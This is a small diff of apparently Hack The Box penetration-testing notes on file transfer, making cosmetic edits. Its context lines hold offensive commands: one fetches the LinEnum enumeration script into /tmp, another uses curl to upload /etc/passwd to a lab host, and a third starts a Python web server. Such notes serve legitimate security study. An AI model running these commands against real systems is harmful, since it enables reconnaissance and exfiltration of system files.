@@ -1,6 +1,5 @@
 
 # Download files
-
 ```shell
 wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
 
@@ -48,7 +47,7 @@ h@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' 
 ```
 
 Python/PHP/Ruby servers:
-
+[[python]] [[php]] [[ruby]]
 ```shell
 h@htb[/htb]$ python3 -m http.server
 
